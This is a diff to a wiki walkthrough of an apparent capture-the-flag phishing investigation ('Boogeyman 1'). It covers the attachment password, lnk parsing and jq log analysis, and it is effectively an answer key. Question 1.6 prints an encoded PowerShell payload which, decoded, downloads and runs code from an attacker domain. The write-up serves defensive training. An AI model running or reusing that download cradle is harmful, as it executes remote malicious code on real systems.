@@ -2,7 +2,7 @@
 title: Boogeyman 1
 description: 
 published: true
-date: 2025-08-08T15:07:37.291Z
+date: 2025-08-08T15:46:46.593Z
 tags: 
 editor: markdown
 dateCreated: 2025-08-08T14:34:09.156Z
@@ -106,3 +106,53 @@ To get the attachment of the mail I finally opened the mail in Thunderbird and d
 
 > Invoice_20230103.lnk
 {.is-success}
+
+### 1.5 What is the password of the encrypted attachment?
+
+The password was plain in the email:
+
+![5_1.png](/thm/challenges/boogeyman_1/5_1.png)
+
+> Invoice2023!
+{.is-success}
+
+### 1.6 Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?
+
+I unzipped the archive and used `lnkparse Invoice_20230103.lnk` to parse the content of this lnk. There I found the encoded string: 
+
+![6_1.png](/thm/challenges/boogeyman_1/6_1.png)
+
+> aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
+{.is-success}
+
+
+## 2. Endpoint Security - Are you sure that's an invoice?
+
+Based on the initial findings, we discovered how the malicious attachment compromised Julianne's workstation:
+
+- A PowerShell command was executed.
+- Decoding the payload reveals the starting point of endpoint activities. 
+
+**Investigation Guide**
+
+With the following discoveries, we should now proceed with analysing the PowerShell logs to uncover the potential impact of the attack:
+
+- Using the previous findings, we can start our analysis by searching the execution of the initial payload in the PowerShell logs.
+- Since the given data is JSON, we can parse it in CLI using the jq command.
+- Note that some logs are redundant and do not contain any critical information; hence can be ignored.
+
+**JQ Cheatsheet**
+
+jq is a lightweight and flexible command-line JSON processor. This tool can be used in conjunction with other text-processing commands. 
+
+You may use the following table as a guide in parsing the logs in this task.
+
+![0_2.png](/thm/challenges/boogeyman_1/0_2.png)
+
+### 2.1 What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)
+
+I never worked with the `jq` tool before so I had to do some try and errors. I got familiar with it first by getting all the fields thats in there. After some failed tries I successfully used `cat powershell.json | jq keys[] | sort | uniq` to get all the keys that are available:
+
+![7_1.png](/thm/challenges/boogeyman_1/7_1.png)
+
+
